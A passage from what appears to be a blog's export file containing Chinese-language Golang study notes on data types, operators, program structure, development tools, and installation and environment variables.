    <url>/2018/08/22/Golang%20%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<center>Golang 数据类型与运算符学习。</center>

<a id="more"></a>
<h4 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h4><p>　　Go 语言基本数据类型分为数字、字符串和布尔型，以下是具体介绍：</p>
<ul>
<li><strong>布尔型：bool</strong></li>
<li><ul>
<li>长度：1字节</li>
<li>取值范围：true, false</li>
<li>注意事项：不可以用数字代表true或false</li>
</ul>
</li>
<li><strong>整型：int/uint</strong></li>
<li><ul>
<li>根据运行程序所在的操作系统类型所决定的，可能为32或64位。int 型是计算最快的一种类型。</li>
</ul>
</li>
<li><strong>8位整型：int8/uint8</strong></li>
<li><ul>
<li>长度：1字节</li>
<li>取值范围：-128~127/0~255</li>
<li>字节型：byte（uint8别名）</li>
</ul>
</li>
<li><strong>16位整型：int16/uint16</strong></li>
<li><ul>
<li>长度：2字节</li>
<li>取值范围：-32768~32767/0~65535</li>
</ul>
</li>
<li><strong>32位整型：int32（rune）/uint32</strong></li>
<li><ul>
<li>长度：4字节</li>
<li>取值范围：-2^32/2~2^32/2-1/0~2^32-1</li>
</ul>
</li>
<li><strong>64位整型：int64/uint64</strong></li>
<li><ul>
<li>长度：8字节</li>
<li>取值范围：-2^64/2~2^64/2-1/0~2^64-1</li>
</ul>
</li>
<li><strong>浮点型：float32/float64</strong></li>
<li><ul>
<li>长度：4/8字节</li>
<li>小数位：float32 精确到小数点后 7 位，float64 精确到小数点后 15 位。由于精确度的缘故，你在使用 <code>==</code> 或者 <code>!=</code> 来比较浮点数时应当非常小心。</li>
</ul>
</li>
<li><strong>复数：complex64/complex128</strong></li>
<li><ul>
<li>长度：8/16字节</li>
</ul>
</li>
<li><strong>足够保存指针的 32 位或 64 位整数型：uintpt</strong></li>
<li><strong>字符串：string</strong></li>
</ul>
<p>　　<strong>类型零值</strong>：零值并不等于空值，而是当变量被声明为某种类型后的默认值，通常情况下值类型的默认值为0，<code>bool</code> 为 <code>false</code>，<code>string</code> 为空字符串</p>
<p><strong>格式化说明符</strong></p>
<p>　　格式化输出时需要根据数据类型指定输出格式，Go 语言中使用的格式化说明符有：</p>
<ul>
<li><strong>布尔值</strong><ul>
<li><code>%t</code>：true 或 false。</li>
</ul>
</li>
<li><strong>普通值</strong>：<ul>
<li><code>%v</code>：相应值的默认格式。</li>
<li><code>%T</code>：相应值的类型的Go语法表示。</li>
</ul>
</li>
<li><strong>整数</strong><ul>
<li><code>%b</code>：二进制表示</li>
<li><code>%d</code>：十进制表示</li>
<li><code>%o</code>：八进制表示</li>
<li><code>%q</code>：单引号围绕的字符字面值，由Go语法安全地转义</li>
<li><code>%x</code>：十六进制表示，字母形式为小写 a-f</li>
<li><code>%X</code>：十六进制表示，字母形式为大写 A-F  </li>
</ul>
</li>
<li><strong>浮点数与复数</strong><ul>
<li><code>%b</code>：无小数部分的，指数为二的幂的科学计数法，与 strconv.FormatFloat的 ‘b’ 转换格式一致。例如 -123456p-78</li>
<li><code>%e</code>：科学计数法，例如 -1234.456e+78                         </li>
<li><code>%E</code>：科学计数法，例如 -1234.456E+78 </li>
<li><code>%f</code>：有小数点而无指数，例如 123.456</li>
<li><code>%g</code>：根据情况选择 %e 或 %f 以产生更紧凑的（无末尾的0）输出</li>
<li><code>%G</code>：根据情况选择 %E 或 %f 以产生更紧凑的（无末尾的0）输出  </li>
</ul>
</li>
<li><strong>字符串和字节切片</strong><ul>
<li><code>%s</code>：输出字符串表示（string类型或[]byte) </li>
<li><code>%q</code>：双引号围绕的字符串，由Go语法安全地转义     </li>
<li><code>%x</code>：十六进制，小写字母，每字节两个字符      </li>
<li><code>%X</code>：十六进制，大写字母，每字节两个字符</li>
</ul>
</li>
<li><strong>指针</strong><ul>
<li><code>%p</code>：十六进制表示，前缀 0x</li>
</ul>
</li>
</ul>
<h4 id="复合数据类型"><a href="#复合数据类型" class="headerlink" title="复合数据类型"></a>复合数据类型</h4><p>　　Go 语言中的复合数据类型以下几种，将在后续博客中详细介绍。</p>
<ul>
<li><strong>值类型</strong>：<code>array</code>、<code>struct</code></li>
<li><strong>引用类型</strong>：<code>slice</code>、<code>map</code>、<code>chan</code></li>
<li><strong>接口类型</strong>：<code>interface</code></li>
<li><strong>JSON、文本等</strong></li>
</ul>
<h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p>　　常见可用于整数和浮点数的二元运算符有 <code>+</code>、<code>-</code>、<code>*</code> 和 <code>/</code>。对于整数运算而言，结果依旧为整数：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">9</span> / <span class="number">4</span> -&gt; <span class="number">2</span></div></pre></td></tr></table></figure>
<p>　　取余运算符 <code>%</code> 只能作用于整数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">9 % 4 -&gt; 1</div></pre></td></tr></table></figure>
<p>　　可以将语句 <code>b = b + a</code> 简写为 <code>b+=a</code>，同样的写法也可用于 <code>-=</code>、<code>*=</code>、<code>/=</code>、<code>%=</code>。对于整数和浮点数，也可以使用一元运算符 <code>++</code>（递增）和 <code>--</code>（递减），但只能用于后缀。并且，带有 <code>++</code> 和 <code>--</code> 的只能作为语句，而非表达式。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">i++ -&gt; i += <span class="number">1</span> -&gt; i = i + <span class="number">1</span></div><div class="line">n := i++	<span class="comment">// 无效</span></div></pre></td></tr></table></figure>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>　　Go 中拥有以下逻辑运算符：<code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&lt;=</code>、<code>&gt;</code>、<code>&gt;=</code>。它们之所以被称为逻辑运算符是因为它们的运算结果总是为布尔值 <code>bool</code>。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">10</span> &gt; <span class="number">5</span> -&gt; <span class="literal">true</span></div></pre></td></tr></table></figure>
<h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><p>　　位运算只能用于整数类型的变量，且需当它们拥有等长位模式时。</p>
<ul>
<li>按位与 <code>&amp;</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">1</span> &amp; <span class="number">1</span> -&gt; <span class="number">1</span></div><div class="line"><span class="number">1</span> &amp; <span class="number">0</span> -&gt; <span class="number">0</span></div><div class="line"><span class="number">0</span> &amp; <span class="number">1</span> -&gt; <span class="number">0</span></div><div class="line"><span class="number">0</span> &amp; <span class="number">0</span> -&gt; <span class="number">0</span></div></pre></td></tr></table></figure>
<ul>
<li>按位或 <code>|</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">1</span> | <span class="number">1</span> -&gt; <span class="number">1</span></div><div class="line"><span class="number">1</span> | <span class="number">0</span> -&gt; <span class="number">1</span></div><div class="line"><span class="number">0</span> | <span class="number">1</span> -&gt; <span class="number">1</span></div><div class="line"><span class="number">0</span> | <span class="number">0</span> -&gt; <span class="number">0</span></div></pre></td></tr></table></figure>
<ul>
<li>按位异或 <code>^</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">1</span> ^ <span class="number">1</span> -&gt; <span class="number">0</span></div><div class="line"><span class="number">1</span> ^ <span class="number">0</span> -&gt; <span class="number">1</span></div><div class="line"><span class="number">0</span> ^ <span class="number">1</span> -&gt; <span class="number">1</span></div><div class="line"><span class="number">0</span> ^ <span class="number">0</span> -&gt; <span class="number">0</span></div></pre></td></tr></table></figure>
<ul>
<li>按位置零 <code>&amp;^</code>：将运算符左边数据相异的位保留，相同位清零。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">0</span> &amp;^ <span class="number">0</span> -&gt; <span class="number">0</span></div><div class="line"><span class="number">0</span> &amp;^ <span class="number">1</span> -&gt; <span class="number">0</span></div><div class="line"><span class="number">1</span> &amp;^ <span class="number">0</span> -&gt; <span class="number">1</span></div><div class="line"><span class="number">1</span> &amp;^ <span class="number">1</span> -&gt; <span class="number">0</span></div></pre></td></tr></table></figure>
<ul>
<li>按位补足 <code>^</code>运算符与异或运算符一同使用</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">^<span class="number">1</span> -&gt; <span class="number">0</span>	<span class="comment">// 作为一元运算符，即按位取反</span></div><div class="line"><span class="number">1</span> ^ <span class="number">0</span> -&gt; <span class="number">1</span> <span class="comment">// 作为二元运算符，即按位异或</span></div></pre></td></tr></table></figure>
<ul>
<li>位左移 <code>&lt;&lt;</code> ，向左移动 n 位，右侧空白部分使用 0 填充</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">1</span> &lt;&lt; <span class="number">10</span> <span class="comment">// 等于 1 KB</span></div><div class="line"><span class="number">1</span> &lt;&lt; <span class="number">20</span> <span class="comment">// 等于 1 MB</span></div><div class="line"><span class="number">1</span> &lt;&lt; <span class="number">30</span> <span class="comment">// 等于 1 GB</span></div></pre></td></tr></table></figure>
<ul>
<li>位右移 <code>&gt;&gt;</code>，向右移动 n 位，左侧空白部分使用 0 填充</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">1</span> &gt;&gt; <span class="number">2</span> -&gt; <span class="number">001</span> <span class="comment">// 二进制</span></div></pre></td></tr></table></figure>
<h4 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h4><p>　　有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">优先级 	   运算符</div><div class="line"> 7 		^ !</div><div class="line"> 6 		* / % &lt;&lt; &gt;&gt; &amp; &amp;^</div><div class="line"> 5 		+ - | ^</div><div class="line"> 4 		== != &lt; &lt;= &gt;= &gt;</div><div class="line"> 3 		&lt;-</div><div class="line"> 2 		&amp;&amp;</div><div class="line"> 1 		||</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-基本结构</title>
    <url>/2018/08/21/Golang%20%E7%AC%94%E8%AE%B0-%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<center>Golang 程序基本结构学习。</center>

<a id="more"></a>
<p>　　程序一般由关键字、常量、变量、运算符、类型和函数组成。程序中可能会使用到这些分隔符：括号 <code>()</code>，中括号 <code>[]</code> 和大括号 <code>{}</code>。程序中可能会使用到这些标点符号：<code>.</code>、<code>,</code>、<code>;</code>、<code>:</code> 和 <code>…</code>。程序的代码通过语句来实现结构化。每个语句不需要像 C 家族中的其它语言一样以分号 <code>;</code> 结尾，因为这些工作都将由 Go 编译器自动完成。</p>
<h4 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h4><p>　　有效的标识符必须以字符（可以使用任何 UTF-8 编码的字符或 <code>_</code>）开头，然后紧跟着 0 个或多个字符或 Unicode 数字。</p>
<p>　　<code>_</code> 是一个特殊的标识符，被称为空白标识符。它可以像其他标识符那样用于变量的声明或赋值（任何类型都可以赋值给它），但任何赋给这个标识符的值都将被抛弃，因此这些值不能在后续的代码中使用，也不可以使用这个标识符作为变量对其它变量进行赋值或运算。</p>
<h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><p>Go 语言中定义的25个关键字：</p>
<table>
<thead>
<tr>
<th>break</th>
<th>default</th>
<th>func</th>
<th>interface</th>
<th>select</th>
</tr>
</thead>
<tbody>
<tr>
<td>case</td>
<td>defer</td>
<td>go</td>
<td>map</td>
<td>struct</td>
</tr>
<tr>
<td>chan</td>
<td>else</td>
<td>goto</td>
<td>package</td>
<td>switch</td>
</tr>
<tr>
<td>const</td>
<td>fallthrough</td>
<td>if</td>
<td>range</td>
<td>type</td>
</tr>
<tr>
<td>continue</td>
<td>for</td>
<td>import</td>
<td>return</td>
<td>var</td>
</tr>
</tbody>
</table>
<p><strong>分类整理：</strong></p>
<ul>
<li>基本结构<ul>
<li>变量、常量：<code>var</code> <code>const</code></li>
<li>包管理：<code>package</code> <code>import</code></li>
</ul>
</li>
<li>基本组件<ul>
<li>函数：<code>func</code> <code>return</code></li>
<li>自定义类型：<code>interface</code> <code>struct</code> <code>type</code></li>
<li>引用类型：<code>map</code> <code>range</code></li>
</ul>
</li>
<li>流程控制<ul>
<li>并发：<code>go</code> <code>select</code> <code>chan</code></li>
<li>单分支流程：<code>if</code> <code>else</code></li>
<li>多分支流程：<code>switch</code> <code>case</code> <code>default</code> <code>fallthrough</code></li>
<li>循环流程：<code>for</code> <code>break</code> <code>continue</code></li>
<li><code>goto</code></li>
<li><code>defer</code></li>
</ul>
</li>
</ul>
<h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>Go 语言版 hello world ：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	fmt.Println(<span class="string">"hello, world"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="包"><a href="#包" class="headerlink" title="包"></a>包</h5><p>　　包是结构化代码的一种方式：每个程序都由包的概念组成，可以使用自身的包或者从其它包中导入内容。如同其它一些编程语言中的类库或命名空间的概念，每个 Go 文件都属于且仅属于一个包。一个包可以由许多以 <code>.go</code> 为扩展名的源文件组成，因此文件名和包名一般来说都是不相同的。</p>
<p>　　如上，在源文件中非注释的第一行指明这个文件属于哪个包，如：<code>package main</code>。<code>package main</code>表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 <code>main</code> 的包。</p>
<p>　　一个应用程序可以包含不同的包，而且即使你只使用 main 包也不必把所有的代码都写在一个巨大的文件里：你可以用一些较小的文件，并且在每个文件非注释的第一行都使用 <code>package main</code> 来指明这些文件都属于 main 包。另外要注意的是，所有的包名都应该使用小写字母。</p>
<p>　　一个 Go 程序是通过 <code>import</code> 关键字将一组包链接在一起。<code>import &quot;fmt&quot;</code> 告诉 Go 编译器这个程序需要使用 <code>fmt</code> 包（的函数，或其他元素），<code>fmt</code> 包实现了格式化 IO（输入/输出）的函数。包名被封闭在半角双引号 <code>&quot;&quot;</code> 中。如果你打算从已编译的包中导入并加载公开声明的方法，不需要插入已编译包的源代码。</p>
<p>　　如果需要多个包，它们可以被分别导入：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></div><div class="line"><span class="keyword">import</span> <span class="string">"os"</span></div></pre></td></tr></table></figure>
<p>　　或（该方式被称为因式分解关键字，同样适用于 const、var 和 type 的声明或定义）：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> (</div><div class="line">   <span class="string">"fmt"</span></div><div class="line">   <span class="string">"os"</span></div><div class="line">)</div></pre></td></tr></table></figure>
<p>　　如果你导入了一个包却没有使用它，则会在构建程序时引发错误，如 <code>imported and not used: os</code>，这正是遵循了 Go 的格言：“没有不必要的代码！“。</p>
<p>　　包也可以作为命名空间使用，帮助避免命名冲突（名称冲突）：两个包中的同名变量的区别在于他们的包名，例如 <code>pack1.Thing</code> 和 <code>pack2.Thing</code>。另外，可以通过使用包的别名来解决包名之间的名称冲突，或者说根据你的个人喜好对包名进行重新设置，如：<code>import fm &quot;fmt&quot;</code>。</p>
<h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p>　　<code>main</code> 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 <code>init()</code> 函数则会先执行该函数）。如果你的 <code>main</code> 包的源代码没有包含 <code>main</code> 函数，则会引发构建错误 <code>undefined: main.main</code>。<code>main</code> 函数既没有参数，也没有返回类型。</p>
<p>　　函数里的代码（函数体）使用大括号 <code>{}</code> 括起来。左大括号 <code>{</code> 必须与方法的声明放在同一行，这是编译器的强制规定。对于大括号 <code>{}</code> 的使用规则在任何时候都是相同的（如：if 语句等）。</p>
<p>　　只有当某个函数需要被外部包调用的时候才使用大写字母开头，并遵循 Pascal 命名法；否则就遵循骆驼命名法，即第一个单词的首字母小写，其余单词的首字母大写。</p>
<p>　　如上，<code>fmt.Println(&quot;hello, world&quot;)</code> 调用了 <code>fmt</code> 包中的 <code>Println</code> 函数，可以将字符串输出到控制台，并在最后自动增加换行字符 <code>\n</code> 。</p>
<h5 id="Go-程序基本思路"><a href="#Go-程序基本思路" class="headerlink" title="Go 程序基本思路"></a>Go 程序基本思路</h5><ul>
<li>在完成包的 import 之后，开始对常量、变量和类型的定义或声明。</li>
<li>如果存在 init 函数的话，则对该函数进行定义（这是一个特殊的函数，每个含有该函数的包都会首先执行这个函数）。</li>
<li>如果当前包是 main 包，则定义 main 函数。</li>
<li>然后定义其余的函数，首先是类型的方法，接着是按照 main 函数中先后调用的顺序来定义相关函数，如果有很多函数，则可以按照字母顺序来进行排序。</li>
</ul>
<h5 id="Go-程序执行顺序"><a href="#Go-程序执行顺序" class="headerlink" title="Go 程序执行顺序"></a>Go 程序执行顺序</h5><ul>
<li>按顺序导入所有被 main 包引用的其它包，然后在每个包中执行如下流程：</li>
<li>如果该包又导入了其它的包，则从第一步开始递归执行，但是每个包只会被导入一次。</li>
<li>然后以相反的顺序在每个包中初始化常量和变量，如果该包含有 init 函数的话，则调用该函数。</li>
<li>在完成这一切之后，main 也执行同样的过程，最后调用 main 函数开始执行程序。</li>
</ul>
<h5 id="命名规范与可见性规则"><a href="#命名规范与可见性规则" class="headerlink" title="命名规范与可见性规则"></a>命名规范与可见性规则</h5><p>　　Go 语言中对象的命名也应该是简洁且有意义的。名称不需要指出自己所属的包，因为在调用的时候会使用包名作为限定符。返回某个对象的函数或方法的名称一般都是使用名词，没有 <code>Get...</code> 之类的字符，如果是用于修改某个对象，则使用 <code>SetName</code>。有必须要的话可以使用大小写混合的方式，如 MixedCaps 或 mixedCaps，而不是使用下划线来分割多个名称。</p>
<p>　　当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个<strong>大写字母开头</strong>，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 <strong>public</strong> ）；标识符如果以<strong>小写字母开头</strong>，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 <strong>private</strong> ）。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-开发工具</title>
    <url>/2018/08/20/Golang%20%E7%AC%94%E8%AE%B0-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<center>Golang 开发工具介绍。</center>

<a id="more"></a>
<h4 id="编辑器与-IDE"><a href="#编辑器与-IDE" class="headerlink" title="编辑器与 IDE"></a>编辑器与 IDE</h4><ul>
<li><strong>Sublime Text</strong> 是一个革命性的跨平台（Linux、Mac OS X、Windows）文本编辑器，它支持编写非常多的编程语言代码。对于 Go 而言，它有一个插件叫做 GoSublime 来支持代码补全和代码模版。</li>
<li><strong>LiteIDE</strong> 这是一款专门针对 Go 开发的集成开发环境，在编辑、编译和运行 Go 程序和项目方面都有非常好的支持。同时还包括了对源代码的抽象语法树视图和一些内置工具（由国人 vfc 大叔开发）。</li>
<li><strong>GoClipse</strong> 是一款 Eclipse IDE 的插件，拥有非常多的特性以及通过 GoCode 来实现代码补全功能。</li>
<li><strong>Goland</strong> 是 Jetbrains 开发的 Go IDE，号称 <code>A Clever IDE to Go</code> ，提供代码辅助、代码编辑器、插件生态系统以及各种集成工具，功能十分完善（<strong>推荐！！！</strong>）。</li>
</ul>
<h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4><h5 id="go-get-工具"><a href="#go-get-工具" class="headerlink" title="go get 工具"></a>go get 工具</h5><p>　　<code>go get</code> 命令主要是用来动态获取远程代码包的，目前支持的有BitBucket、GitHub、Google Code和Launchpad。这个命令在内部实际上分成了两步操作：第一步是下载源码包，第二步是执行go install。</p>
<p>　　go get 命令本质上可以理解为：首先通过源码工具clone代码到src目录，然后执行go install。</p>
<h5 id="go-build-工具"><a href="#go-build-工具" class="headerlink" title="go build 工具"></a>go build 工具</h5><p>　　go build 命令主要是用于测试编译。在包的编译过程中，若有必要，会同时编译与之相关联的包。</p>
<ul>
<li>如果是普通包，当你执行 go build 命令后，不会产生任何文件。</li>
<li>如果是 main 包，当只执行 go build 命令后，会在当前目录下生成一个可执行文件。</li>
</ul>
<h5 id="go-install-工具"><a href="#go-install-工具" class="headerlink" title="go install 工具"></a>go install 工具</h5><p>　　<code>go install</code> 是安装 Go 包的工具，主要用于安装非标准库的包文件，将源代码编译成对象文件。</p>
<p>　　这个命令在内部实际上分成了两步操作：第一步是生成结果文件(可执行文件或者.a包)，第二步会把编译好的结果移到 <code>$GOPATH/pkg</code> 或者 <code>$GOPATH/bin</code>。</p>
<p>与 <code>go build</code> 命令对比：</p>
<table>
<thead>
<tr>
<th></th>
<th>go install</th>
<th>go build</th>
</tr>
</thead>
<tbody>
<tr>
<td>生成的可执行文件路径</td>
<td>工作目录下的 bin 目录下</td>
<td>当前目录下</td>
</tr>
<tr>
<td>可执行文件的名字</td>
<td>与源码所在目录同名</td>
<td>默认与源程序同名，可以使用 -o 选项指定</td>
</tr>
<tr>
<td>依赖</td>
<td>将依赖的包放到工作目录下的 pkg 文件夹下</td>
<td>——</td>
</tr>
</tbody>
</table>
<h5 id="go-fmt-工具"><a href="#go-fmt-工具" class="headerlink" title="go fmt 工具"></a>go fmt 工具</h5><p>　　Go 开发团队不想要 Go 语言像许多其它语言那样总是在为代码风格而引发无休止的争论，浪费大量宝贵的开发时间，因此他们制作了一个工具：<code>go fmt</code>（<code>gofmt</code>）。</p>
<p>　　<code>go fmt</code> 工具可以将你的源代码格式化成符合官方统一标准的风格，属于语法风格层面上的小型重构。遵循统一的代码风格是 Go 开发中无可撼动的铁律，因此你必须在编译或提交版本管理系统之前使用 <code>gofmt</code> 来格式化你的代码。LiteIDE 和 Goland中都已经集成该工具，保存文件时会自动进行格式化。</p>
<p>　　另外，在 Go 语言中注释代码的方式有：</p>
<ul>
<li>// ：单行注释</li>
<li>/<em> </em>/：多行注释</li>
</ul>
<h5 id="go-doc-工具"><a href="#go-doc-工具" class="headerlink" title="go doc 工具"></a>go doc 工具</h5><p>　　<code>go doc</code> 工具会从 Go 程序和包文件中提取顶级声明的首行注释以及每个对象的相关注释，并生成相关文档。这个工具只能获取在 Go 安装目录下 <code>../go/src</code> 中的注释内容。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">go</span> doc <span class="keyword">package</span> 获取包的文档注释</div><div class="line"><span class="keyword">go</span> doc <span class="keyword">package</span>/subpackage 获取子包的文档注释</div><div class="line"><span class="keyword">go</span> doc <span class="keyword">package</span> function 获取某个函数在某个包中的文档注释</div></pre></td></tr></table></figure>
<p>　　此外，<code>go doc</code>  还可以作为一个本地在线文档浏览 web 服务器。在命令行输入 <code>godoc -http=:8080</code>，然后使用浏览器打开 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080</a> 后，你就可以看到本地文档浏览服务器提供的页面。</p>
<h4 id="其它工具"><a href="#其它工具" class="headerlink" title="其它工具"></a>其它工具</h4><ul>
<li><strong>go run</strong>：直接运行程序。</li>
<li><strong>go test</strong>：是一个轻量级的单元测试框架。</li>
<li><strong>go clean</strong>：用来移除当前源码包和关联源码包里面编译生成的文件。</li>
<li><strong>go fix</strong>：用于将你的 Go 代码从旧的发行版迁移到最新的发行版，它主要负责简单的、重复的、枯燥无味的修改工作，如果像 API 等复杂的函数修改，工具则会给出文件名和代码行数的提示以便让开发人员快速定位并升级代码。Go 开发团队一般也使用这个工具升级 Go 内置工具以及 谷歌内部项目的代码。</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-安装</title>
    <url>/2018/08/19/Golang%20%E7%AC%94%E8%AE%B0-%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<center>Golang 安装与环境配置介绍。</center>

<a id="more"></a>
<h4 id="Golang-编译器"><a href="#Golang-编译器" class="headerlink" title="Golang 编译器"></a>Golang 编译器</h4><p>　　Golang 目前有2个版本的编译器：Go 原生编译器 gc 和非原生编译器 gccgo，这两款编译器都是在类 Unix 系统下工作 。其中，gc 版本的编译器已经被移植到 Windows 平台上，并集成在主要发行版中，你也可以通过安装 MinGW 从而在 Windows 平台下使用 gcc 编译器。 </p>
<p>　　对于非常底层的纯 Go 语言代码或者包而言，在各个操作系统平台上的可移植性是非常强的，只需要将源码拷贝到相应平台上进行编译即可，或者可以使用交叉编译来构建目标平台的应用程序。</p>
<h4 id="Golang-安装"><a href="#Golang-安装" class="headerlink" title="Golang 安装"></a>Golang 安装</h4><p>　　支持 Linux、Windows 和 Mac OS 上的安装，可参考下面的教程根据自己的需要进行安装：</p>
<ul>
<li>官方安装教程：<a href="https://golang.org/doc/install" target="_blank" rel="external">https://golang.org/doc/install</a> （需要翻墙）</li>
<li>菜鸟教程 Go 语言环境安装：<a href="http://www.runoob.com/go/go-environment.html" target="_blank" rel="external">http://www.runoob.com/go/go-environment.html</a></li>
</ul>
<h4 id="Golang-环境变量"><a href="#Golang-环境变量" class="headerlink" title="Golang 环境变量"></a>Golang 环境变量</h4><p>　　通过 <code>go env</code> 命令可以查看 Go 语言的环境信息。 其中，</p>
<ul>
<li><strong>$GOROOT</strong> 表示 Go 在你的电脑上的安装位置，它的值一般都是 <code>$HOME/go</code>，当然，你也可以安装在别的地方。</li>
<li><strong>$GOARCH</strong> 表示目标机器的处理器架构，它的值可以是 386、amd64 或 arm。</li>
<li><strong>$GOOS</strong> 表示目标机器的操作系统，它的值可以是 darwin、freebsd、linux 或 windows。</li>
<li><strong>$GOBIN</strong> 表示编译器和链接器的安装位置，默认是 <code>$GOROOT/bin</code>，如果你使用的是 Go 1.0.3 及以后的版本，一般情况下你可以将它的值设置为空，Go 将会使用前面提到的默认值。</li>
</ul>
<p>　　目标机器是指你打算运行你的 Go 应用程序的机器。Go 编译器支持交叉编译，也就是说你可以在一台机器上构建运行在具有不同操作系统和处理器架构上运行的应用程序，也就是说编写源代码的机器可以和目标机器有完全不同的特性（操作系统与处理器架构）。</p>
<p>　　为了区分本地机器和目标机器，你可以使用 <code>$GOHOSTOS</code> 和 <code>$GOHOSTARCH</code> 设置本地机器的操作系统名称和编译体系结构，这两个变量只有在进行交叉编译的时候才会用到，如果你不进行显示设置，他们的值会和本地机器（<code>$GOOS</code> 和 <code>$GOARCH</code>）一样。</p>
<ul>
<li><strong>$GOPATH</strong> 默认采用和 <code>$GOROOT</code> 一样的值，但从 Go 1.1 版本开始，你必须修改为其它路径。它可以包含多个包含 Go 语言源码文件、包文件和可执行文件的路径，而这些路径下又必须分别包含三个规定的目录：<code>src</code>、<code>pkg</code> 和 <code>bin</code>，这三个目录分别用于存放源码文件、包文件和可执行文件。</li>
<li><strong>$GOARM</strong> 专门针对基于 arm 架构的处理器，它的值可以是 5 或 6，默认为 6。</li>
<li><strong>$GOMAXPROCS</strong> 用于设置应用程序可使用的处理器个数与核数。</li>
</ul>
<h4 id="Golang-安装目录"><a href="#Golang-安装目录" class="headerlink" title="Golang 安装目录"></a>Golang 安装目录</h4><p>　　Go 安装目录（<code>$GOROOT</code>）的文件夹结构应该如下所示：</p>
<ul>
<li><code>/bin</code>：包含可执行文件，如：编译器，Go 工具</li>
<li><code>/doc</code>：包含示例程序，代码工具，本地文档等</li>
<li><code>/lib</code>：包含文档模版</li>
<li><code>/misc</code>：包含与支持 Go 编辑器有关的配置文件以及 cgo 的示例</li>
<li><code>/os_arch</code>：包含标准库的包的对象文件（<code>.a</code>）</li>
<li><code>/src</code>：包含源代码构建脚本和标准库的包的完整源代码（Go 是一门开源语言）</li>
<li><code>/src/cmd</code>：包含 Go 和 C 的编译器和命令行脚本</li>
</ul>
<p>　　此外，还有 README.md, AUTHORS, CONTRIBUTORS, LICENSE 文件</p>
<h4 id="Golang-工作空间"><a href="#Golang-工作空间" class="headerlink" title="Golang 工作空间"></a>Golang 工作空间</h4><p>　　Go 的源代码必须存放在 workspace 中。 <code>GOPATH</code>环境变量 指明了你的工作空间的位置，该目录可以是任意的，唯一的要求是不能是你安装 Go 时的目录。workspace 是一个目录（directory hierachy），在这个目录下有三个子目录：</p>
<ul>
<li><code>src</code> 包含 Go 源代码文件, 源代码文件组织成 packages (one package per directory)</li>
<li><code>pkg</code> 包含 package objects （二进制的包）</li>
<li><code>bin</code> 包含 可执行的命令 command（可执行的二进制文件）</li>
</ul>
<p>　　go tool 编译(build) 源代码文件(source packages)，并且将 resulting binaries 安装在 <code>pkg</code> 和 <code>bin</code> 目录下面。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-简介</title>
